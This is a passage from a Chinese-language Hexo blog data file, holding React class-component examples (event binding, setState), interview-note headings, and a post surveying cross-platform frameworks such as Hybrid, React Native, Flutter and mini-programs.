class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>  <span class=\"hljs-title function_\">handleClick</span>(<span class=\"hljs-params\">e</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">+          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;(e)</span>=&gt;</span>this.handleClick(e)&#125;&gt;按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>  <span class=\"hljs-title function_\">handleClick</span>(<span class=\"hljs-params\">e</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">+          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;this.handleClick.bind(this)&#125;</span>&gt;</span>按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>+  handleClick = <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;this.handleClick&#125;</span>&gt;</span>按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>setState</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br>handleClick = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改数据</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-comment\">// key是要修改的数据名称，value是对应的新值</span><br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span> + <span class=\"hljs-number\">1</span>,<br>  &#125;);<br>&#125;;<br>updateList = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改列表</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-attr\">list</span>: [...<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">list</span>, <span class=\"hljs-string\">&#x27;相机&#x27;</span>],<br>  &#125;);<br>&#125;;<br>updateUser = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改对象</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-attr\">user</span>: &#123;<br>      ...<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">user</span>,<br>      <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;tony&#x27;</span>,<br>    &#125;,<br>  &#125;);<br>&#125;;<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"相同点\"><a href=\"#相同点\" class=\"headerlink\" title=\"相同点\"></a>相同点</h5><ul>\n<li>都可以接受属性，返回React元素；</li>\n</ul>\n<h5 id=\"不同点\"><a href=\"#不同点\" class=\"headerlink\" title=\"不同点\"></a>不同点</h5><ul>\n<li>编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；</li>\n<li>内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；</li>\n<li>捕获特性：函数组件具有值捕获特性；</li>\n<li>状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态</li>\n<li>生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能</li>\n<li>逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用</li>\n<li>跳过更新：类组件可以通过 <code>shouldComponentUpdate</code> 和 <code>PureComponent</code> 来跳过更新，而函数式组件可以使用 <code>React.memo</code> 来跳过更新</li>\n<li>发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染</li>\n</ul>\n<h3 id=\"2-React-Hook及其优化策略\"><a href=\"#2-React-Hook及其优化策略\" class=\"headerlink\" title=\"2.React Hook及其优化策略\"></a>2.React Hook及其优化策略</h3><h1 id=\"Webpack相关\"><a href=\"#Webpack相关\" class=\"headerlink\" title=\"Webpack相关\"></a>Webpack相关</h1><h3 id=\"1-Webpack配置\"><a href=\"#1-Webpack配置\" class=\"headerlink\" title=\"1.Webpack配置\"></a>1.Webpack配置</h3><h3 id=\"2-loader执行顺序\"><a href=\"#2-loader执行顺序\" class=\"headerlink\" title=\"2.loader执行顺序\"></a>2.loader执行顺序</h3><h3 id=\"3-html-webpack-plugin的作用\"><a href=\"#3-html-webpack-plugin的作用\" class=\"headerlink\" title=\"3.html webpack plugin的作用\"></a>3.html webpack plugin的作用</h3><h1 id=\"计算机网络相关\"><a href=\"#计算机网络相关\" class=\"headerlink\" title=\"计算机网络相关\"></a>计算机网络相关</h1><h3 id=\"1-CDN的理解\"><a href=\"#1-CDN的理解\" class=\"headerlink\" title=\"1.CDN的理解\"></a>1.CDN的理解</h3><h3 id=\"2-跨域问题：什么是跨域？如何解决？\"><a href=\"#2-跨域问题：什么是跨域？如何解决？\" class=\"headerlink\" title=\"2.跨域问题：什么是跨域？如何解决？\"></a>2.跨域问题：什么是跨域？如何解决？</h3><h3 id=\"3-节流与防抖\"><a href=\"#3-节流与防抖\" class=\"headerlink\" title=\"3.节流与防抖\"></a>3.节流与防抖</h3><h3 id=\"4-TCP和UDP区别，三次握手，阻塞重传\"><a href=\"#4-TCP和UDP区别，三次握手，阻塞重传\" class=\"headerlink\" title=\"4.TCP和UDP区别，三次握手，阻塞重传\"></a>4.TCP和UDP区别，三次握手，阻塞重传</h3><h3 id=\"5-http和https\"><a href=\"#5-http和https\" class=\"headerlink\" title=\"5.http和https\"></a>5.http和https</h3><h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><h3 id=\"1-线程、进程\"><a href=\"#1-线程、进程\" class=\"headerlink\" title=\"1.线程、进程\"></a>1.线程、进程</h3><h1 id=\"网络安全相关\"><a href=\"#网络安全相关\" class=\"headerlink\" title=\"网络安全相关\"></a>网络安全相关</h1><h3 id=\"1-DDOS\"><a href=\"#1-DDOS\" class=\"headerlink\" title=\"1.DDOS\"></a>1.DDOS</h3><h3 id=\"2-Web相关漏洞原理\"><a href=\"#2-Web相关漏洞原理\" class=\"headerlink\" title=\"2.Web相关漏洞原理\"></a>2.Web相关漏洞原理</h3><h1 id=\"算法相关\"><a href=\"#算法相关\" class=\"headerlink\" title=\"算法相关\"></a>算法相关</h1><h1 id=\"Linux相关\"><a href=\"#Linux相关\" class=\"headerlink\" title=\"Linux相关\"></a>Linux相关</h1><h3 id=\"1-linux常用命令\"><a href=\"#1-linux常用命令\" class=\"headerlink\" title=\"1.linux常用命令\"></a>1.linux常用命令</h3><h1 id=\"项目相关\"><a href=\"#项目相关\" class=\"headerlink\" title=\"项目相关\"></a>项目相关</h1><h3 id=\"1-项目上线如何捕获异常？\"><a href=\"#1-项目上线如何捕获异常？\" class=\"headerlink\" title=\"1.项目上线如何捕获异常？\"></a>1.项目上线如何捕获异常？</h3><h3 id=\"2-项目加载头花\"><a href=\"#2-项目加载头花\" class=\"headerlink\" title=\"2.项目加载头花\"></a>2.项目加载头花</h3>"},{"title":"跨端技术概述","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg15.jpg","_content":"\n\n\n# 跨端技术概述\n\n## 一、跨端是什么？\n\n### 1.跨端背景\n\n- PC端（Windows,Mac）\n- 移动端（iOS，Android）\n- Web端\n- IoT端（车载设备，穿戴设备）\n\n### 2.常见痛点\n\n- 各端功能几乎一致，各端需要单独配置开发人员；\n- 开发、维护成本高；\n- 安卓、IOS发版周期长；\n- ...\n\n### 3.跨端技术方案目标\n\n- 研发效率要高：学习成本低、多端一致性高\n- 用户体验好：稳定性高、性能体验好\n- 动态化：支持动态化下发、满足日益增长的业务需要\n\n## 二、跨端技术介绍\n\n### 1.Hybrid\n\n> 基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/00bf34ff3043dd9d.jpg)\n\n### 2.原生渲染\n\n> 通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；\n\n#### React Native\n\n使用JS+react来开发跨平台的应用（不局限于Web页面）；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/99cd7d1114ab2962.jpg)\n\n### 3.自渲染方案\n\n> 利用Skia重新实现渲染管线，不依赖原生组件；\n\n#### Flutter\n\n一套代码库构建精美的、原生平台编译的多平台应用；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/04aafee09057dff4.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/b4b787eb7bce2d58.jpg)\n\n### 4.小程序方案\n\n> 使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面\n\n#### 字节小程序\n\n#### ![](https://s3.bmp.ovh/imgs/2023/02/04/78dda77ddb939d0d.jpg)\n\n#### 时间管线\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/55a31d9ac425d819.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/812f79882c5af955.jpg)\n\n### 5.方案比较\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/3ce883f80ef07420.jpg)\n\n## 三、基于小程序跨端实践\n\n### 1.开发步骤\n\n- 下载开发者工具\n- 开发、调试\n- 小程序上传\n\n### 2.性能优化\n\n##### \t优化意义\n\n- 留住用户\n- 提升转化率\n- 提升用户体验\n\n##### \t性能指标\n\n```\nLoading-->FP-->LCP\n```\n\n- 加载耗时\n- 取消率\n- 重启率\n- 卡死次数占比\n- LCP到达率\n- 白屏率\n- ...\n\n##### \t优化手段\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/74198b1d11beee76.jpg)\n\n## 四、总结\n\n```\nWrite Once、Run Anywhere！\n```\n\n\n\n\n\n\n\n\n\n","source":"_posts/跨端技术概述.md","raw":"---\ntitle: 跨端技术概述\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 面试笔记\n    - 笔记\nmp3: \ncover: img/bg15.jpg\n---\n\n\n\n# 跨端技术概述\n\n## 一、跨端是什么？\n\n### 1.跨端背景\n\n- PC端（Windows,Mac）\n- 移动端（iOS，Android）\n- Web端\n- IoT端（车载设备，穿戴设备）\n\n### 2.常见痛点\n\n- 各端功能几乎一致，各端需要单独配置开发人员；\n- 开发、维护成本高；\n- 安卓、IOS发版周期长；\n- ...\n\n### 3.跨端技术方案目标\n\n- 研发效率要高：学习成本低、多端一致性高\n- 用户体验好：稳定性高、性能体验好\n- 动态化：支持动态化下发、满足日益增长的业务需要\n\n## 二、跨端技术介绍\n\n### 1.Hybrid\n\n> 基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/00bf34ff3043dd9d.jpg)\n\n### 2.原生渲染\n\n> 通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；\n\n#### React Native\n\n使用JS+react来开发跨平台的应用（不局限于Web页面）；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/99cd7d1114ab2962.jpg)\n\n### 3.自渲染方案\n\n> 利用Skia重新实现渲染管线，不依赖原生组件；\n\n#### Flutter\n\n一套代码库构建精美的、原生平台编译的多平台应用；\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/04aafee09057dff4.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/b4b787eb7bce2d58.jpg)\n\n### 4.小程序方案\n\n> 使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面\n\n#### 字节小程序\n\n#### ![](https://s3.bmp.ovh/imgs/2023/02/04/78dda77ddb939d0d.jpg)\n\n#### 时间管线\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/55a31d9ac425d819.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/812f79882c5af955.jpg)\n\n### 5.方案比较\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/3ce883f80ef07420.jpg)\n\n## 三、基于小程序跨端实践\n\n### 1.开发步骤\n\n- 下载开发者工具\n- 开发、调试\n- 小程序上传\n\n### 2.性能优化\n\n##### \t优化意义\n\n- 留住用户\n- 提升转化率\n- 提升用户体验\n\n##### \t性能指标\n\n```\nLoading-->FP-->LCP\n```\n\n- 加载耗时\n- 取消率\n- 重启率\n- 卡死次数占比\n- LCP到达率\n- 白屏率\n- ...\n\n##### \t优化手段\n\n![](https://s3.bmp.ovh/imgs/2023/02/04/74198b1d11beee76.jpg)\n\n## 四、总结\n\n```\nWrite Once、Run Anywhere！\n```\n\n\n\n\n\n\n\n\n\n","slug":"跨端技术概述","published":1,"updated":"2023-03-27T11:07:06.979Z","_id":"clg29vyib0070ao9ccnw72rgf","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"跨端技术概述\"><a href=\"#跨端技术概述\" class=\"headerlink\" title=\"跨端技术概述\"></a>跨端技术概述</h1><h2 id=\"一、跨端是什么？\"><a href=\"#一、跨端是什么？\" class=\"headerlink\" title=\"一、跨端是什么？\"></a>一、跨端是什么？</h2><h3 id=\"1-跨端背景\"><a href=\"#1-跨端背景\" class=\"headerlink\" title=\"1.跨端背景\"></a>1.跨端背景</h3><ul>\n<li>PC端（Windows,Mac）</li>\n<li>移动端（iOS，Android）</li>\n<li>Web端</li>\n<li>IoT端（车载设备，穿戴设备）</li>\n</ul>\n<h3 id=\"2-常见痛点\"><a href=\"#2-常见痛点\" class=\"headerlink\" title=\"2.常见痛点\"></a>2.常见痛点</h3><ul>\n<li>各端功能几乎一致，各端需要单独配置开发人员；</li>\n<li>开发、维护成本高；</li>\n<li>安卓、IOS发版周期长；</li>\n<li>…</li>\n</ul>\n<h3 id=\"3-跨端技术方案目标\"><a href=\"#3-跨端技术方案目标\" class=\"headerlink\" title=\"3.跨端技术方案目标\"></a>3.跨端技术方案目标</h3><ul>\n<li>研发效率要高：学习成本低、多端一致性高</li>\n<li>用户体验好：稳定性高、性能体验好</li>\n<li>动态化：支持动态化下发、满足日益增长的业务需要</li>\n</ul>\n<h2 id=\"二、跨端技术介绍\"><a href=\"#二、跨端技术介绍\" class=\"headerlink\" title=\"二、跨端技术介绍\"></a>二、跨端技术介绍</h2><h3 id=\"1-Hybrid\"><a href=\"#1-Hybrid\" class=\"headerlink\" title=\"1.Hybrid\"></a>1.Hybrid</h3><blockquote>\n<p>基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/00bf34ff3043dd9d.jpg\"></p>\n<h3 id=\"2-原生渲染\"><a href=\"#2-原生渲染\" class=\"headerlink\" title=\"2.原生渲染\"></a>2.原生渲染</h3><blockquote>\n<p>通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；</p>\n</blockquote>\n<h4 id=\"React-Native\"><a href=\"#React-Native\" class=\"headerlink\" title=\"React Native\"></a>React Native</h4><p>使用JS+react来开发跨平台的应用（不局限于Web页面）；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/99cd7d1114ab2962.jpg\"></p>\n<h3 id=\"3-自渲染方案\"><a href=\"#3-自渲染方案\" class=\"headerlink\" title=\"3.自渲染方案\"></a>3.自渲染方案</h3><blockquote>\n<p>利用Skia重新实现渲染管线，不依赖原生组件；</p>\n</blockquote>\n<h4 id=\"Flutter\"><a href=\"#Flutter\" class=\"headerlink\" title=\"Flutter\"></a>Flutter</h4><p>一套代码库构建精美的、原生平台编译的多平台应用；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/04aafee09057dff4.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/b4b787eb7bce2d58.jpg\"></p>\n<h3 id=\"4-小程序方案\"><a href=\"#4-小程序方案\" class=\"headerlink\" title=\"4.小程序方案\"></a>4.小程序方案</h3><blockquote>\n<p>使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面</p>\n</blockquote>\n<h4 id=\"字节小程序\"><a href=\"#字节小程序\" class=\"headerlink\" title=\"字节小程序\"></a>字节小程序</h4><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/78dda77ddb939d0d.jpg\"></h4><h4 id=\"时间管线\"><a href=\"#时间管线\" class=\"headerlink\" title=\"时间管线\"></a>时间管线</h4><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/55a31d9ac425d819.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/812f79882c5af955.jpg\"></p>\n<h3 id=\"5-方案比较\"><a href=\"#5-方案比较\" class=\"headerlink\" title=\"5.方案比较\"></a>5.方案比较</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/3ce883f80ef07420.jpg\"></p>\n<h2 id=\"三、基于小程序跨端实践\"><a href=\"#三、基于小程序跨端实践\" class=\"headerlink\" title=\"三、基于小程序跨端实践\"></a>三、基于小程序跨端实践</h2><h3 id=\"1-开发步骤\"><a href=\"#1-开发步骤\" class=\"headerlink\" title=\"1.开发步骤\"></a>1.开发步骤</h3><ul>\n<li>下载开发者工具</li>\n<li>开发、调试</li>\n<li>小程序上传</li>\n</ul>\n<h3 id=\"2-性能优化\"><a href=\"#2-性能优化\" class=\"headerlink\" title=\"2.性能优化\"></a>2.性能优化</h3><h5 id=\"优化意义\"><a href=\"#优化意义\" class=\"headerlink\" title=\"优化意义\"></a>优化意义</h5><ul>\n<li>留住用户</li>\n<li>提升转化率</li>\n<li>提升用户体验</li>\n</ul>\n<h5 id=\"性能指标\"><a href=\"#性能指标\" class=\"headerlink\" title=\"性能指标\"></a>性能指标</h5><figure class=\"highlight brainfuck\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs brainfuck\"><span class=\"hljs-comment\">Loading</span><span class=\"hljs-literal\">--</span>&gt;<span class=\"hljs-comment\">FP</span><span class=\"hljs-literal\">--</span>&gt;<span class=\"hljs-comment\">LCP</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>加载耗时</li>\n<li>取消率</li>\n<li>重启率</li>\n<li>卡死次数占比</li>\n<li>LCP到达率</li>\n<li>白屏率</li>\n<li>…</li>\n</ul>\n<h5 id=\"优化手段\"><a href=\"#优化手段\" class=\"headerlink\" title=\"优化手段\"></a>优化手段</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/74198b1d11beee76.jpg\"></p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><figure class=\"highlight mathematica\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mathematica\"><span class=\"hljs-built_in\">Write</span> <span class=\"hljs-built_in\">Once</span>、<span class=\"hljs-built_in\">Run</span> <span class=\"hljs-variable\">Anywhere</span>！<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"跨端技术概述\"><a href=\"#跨端技术概述\" class=\"headerlink\" title=\"跨端技术概述\"></a>跨端技术概述</h1><h2 id=\"一、跨端是什么？\"><a href=\"#一、跨端是什么？\" class=\"headerlink\" title=\"一、跨端是什么？\"></a>一、跨端是什么？</h2><h3 id=\"1-跨端背景\"><a href=\"#1-跨端背景\" class=\"headerlink\" title=\"1.跨端背景\"></a>1.跨端背景</h3><ul>\n<li>PC端（Windows,Mac）</li>\n<li>移动端（iOS，Android）</li>\n<li>Web端</li>\n<li>IoT端（车载设备，穿戴设备）</li>\n</ul>\n<h3 id=\"2-常见痛点\"><a href=\"#2-常见痛点\" class=\"headerlink\" title=\"2.常见痛点\"></a>2.常见痛点</h3><ul>\n<li>各端功能几乎一致，各端需要单独配置开发人员；</li>\n<li>开发、维护成本高；</li>\n<li>安卓、IOS发版周期长；</li>\n<li>…</li>\n</ul>\n<h3 id=\"3-跨端技术方案目标\"><a href=\"#3-跨端技术方案目标\" class=\"headerlink\" title=\"3.跨端技术方案目标\"></a>3.跨端技术方案目标</h3><ul>\n<li>研发效率要高：学习成本低、多端一致性高</li>\n<li>用户体验好：稳定性高、性能体验好</li>\n<li>动态化：支持动态化下发、满足日益增长的业务需要</li>\n</ul>\n<h2 id=\"二、跨端技术介绍\"><a href=\"#二、跨端技术介绍\" class=\"headerlink\" title=\"二、跨端技术介绍\"></a>二、跨端技术介绍</h2><h3 id=\"1-Hybrid\"><a href=\"#1-Hybrid\" class=\"headerlink\" title=\"1.Hybrid\"></a>1.Hybrid</h3><blockquote>\n<p>基于WebView渲染，通过JS Bridge把一部分系统功能开放给JS调用；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/00bf34ff3043dd9d.jpg\"></p>\n<h3 id=\"2-原生渲染\"><a href=\"#2-原生渲染\" class=\"headerlink\" title=\"2.原生渲染\"></a>2.原生渲染</h3><blockquote>\n<p>通过JS开发，通过中间层桥接后使用原生组件来渲染UI界面；</p>\n</blockquote>\n<h4 id=\"React-Native\"><a href=\"#React-Native\" class=\"headerlink\" title=\"React Native\"></a>React Native</h4><p>使用JS+react来开发跨平台的应用（不局限于Web页面）；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/99cd7d1114ab2962.jpg\"></p>\n<h3 id=\"3-自渲染方案\"><a href=\"#3-自渲染方案\" class=\"headerlink\" 